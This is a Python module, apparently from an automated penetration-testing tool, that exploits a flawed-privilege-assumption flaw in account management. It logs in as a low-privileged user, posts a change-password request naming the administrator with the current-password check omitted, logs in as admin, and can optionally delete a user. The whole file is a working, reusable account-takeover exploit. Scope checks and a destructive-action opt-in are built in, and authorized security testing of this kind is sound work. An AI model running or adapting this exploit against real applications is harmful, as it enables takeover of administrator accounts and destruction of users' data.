"""
Trusted-identity account-management flow ("flawed privilege assumption").

Some account-management actions (change-password, change-email, delete) carry the
*account owner* as a request field (a hidden `username`/`id`) and act on whatever
identity the client supplies - instead of the authenticated session owner. When a
verification step (current-password / token) can additionally be omitted, a
low-privileged user can overwrite a privileged account's credentials.

Chain: log in as the provided low-priv identity -> GET /my-account (scrape csrf) ->
POST change-password with `username=<privileged account>` and the verification
field OMITTED -> log in fresh as the privileged account with the new password ->
reach /admin -> (opt-in) perform the destructive objective and check solved.
"""

from __future__ import annotations

import logging
import re
import secrets
from urllib.parse import urlparse

from ..core.scope import Scope, ScopeError
from ..engine.auth import AuthManager
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.account_privilege")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')


def _csrf(html: str | None) -> str | None:
    m = _CSRF.search(html or "")
    return m.group(1) if m else None


def _find_change_pw(registry) -> str | None:
    for e in registry:
        p = e.path.lower()
        if e.method.upper() == "POST" and "change-password" in p:
            return e.path
    return "/my-account/change-password"


def _find_delete(admin_html: str, target: str) -> str | None:
    m = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', admin_html or "")
    return (m.group(1) + target) if m else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.identities:
        return []   # needs a low-priv identity to drive the account page
    if not any("change-password" in e.path.lower() for e in registry):
        return []

    base = scope.authorized_base_urls[0]
    cp_path = _find_change_pw(registry)
    victim = scope.privileged_account or "administrator"
    newpw = "Venr0le!" + secrets.token_hex(4)
    limiter = RateLimiter(scope.rate_limit_per_second)
    me = scope.identities[0]["name"]

    def client(role):
        return ScopedClient(scope, base, role=role, limiter=limiter, transport=transport)

    steps: list[TestStep] = []
    try:
        attacker = client("privesc")
        attacker.apply_auth(await AuthManager(scope, transport=transport).ensure(me))
        acct = await attacker.request("GET", "/my-account", follow_redirects=True)
        steps.append(TestStep(step=1, description=f"log in as '{me}', open /my-account",
                              method="GET", path="/my-account",
                              actual_status=getattr(acct, "status_code", None)))

        # The flaw: server trusts `username` and the verification field can be omitted.
        body = {"csrf": _csrf(acct.text if acct else ""), "username": victim,
                "new-password-1": newpw, "new-password-2": newpw}     # current-password OMITTED
        cr = await attacker.request("POST", cp_path, data=body, follow_redirects=True)
        steps.append(TestStep(step=2,
                              description=f"change '{victim}' password via trusted username (no current-password)",
                              method="POST", path=cp_path,
                              actual_status=getattr(cr, "status_code", None)))
        await attacker.aclose()

        # Fresh session: log in as the privileged account with the new password.
        adminc = client("privesc-admin")
        lg = await adminc.request("GET", "/login")
        await adminc.request("POST", "/login", data={"csrf": _csrf(lg.text if lg else ""),
                             "username": victim, "password": newpw}, follow_redirects=True)
        adm = await adminc.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=3, description=f"log in as '{victim}', access /admin",
                              method="GET", path="/admin",
                              actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            logger.info("account-privilege: /admin not reachable as %s (status=%s)",
                        victim, getattr(adm, "status_code", None))
            await adminc.aclose()
            return []

        solved = False
        target = scope.objective_delete_user
        if target and scope.allow_destructive:
            delpath = _find_delete(adm.text, target) or f"/admin/delete?username={target}"
            dr = await adminc.request("GET", delpath, follow_redirects=True, destructive=True)
            home = await adminc.request("GET", "/", follow_redirects=True)
            solved = bool(home is not None and "is-solved" in (home.text or ""))
            steps.append(TestStep(step=4, description=f"delete user '{target}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))
        elif target:
            logger.info("admin reached; delete '%s' skipped (set allow_destructive to perform it)", target)
        await adminc.aclose()

        note = ("LAB SOLVED (is-solved)" if solved else
                ("admin access achieved; destructive objective not run" if target else
                 "admin access achieved"))
        verdict = Verdict.CONFIRMED_EXPLOIT if (adm_ok and (solved or not target)) else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="ACP-001",
            vulnerability_class=VulnClass.PRIV_ESCALATION,
            hypothesis=(f"Flawed privilege assumption: {cp_path} trusts the client-supplied "
                        "'username' and skips verification when 'current-password' is omitted, "
                        f"so any user can overwrite the '{victim}' account's password and take it over."),
            risk_rating=Severity.CRITICAL,
            affected_endpoint=f"POST {cp_path}",
            business_impact="Account takeover of arbitrary users incl. administrator (full compromise).",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: flawed account-management logic / WSTG-ATHZ-02",
        )]
    except ScopeError as exc:
        logger.warning("account-privilege blocked by scope: %s", exc)
        return []
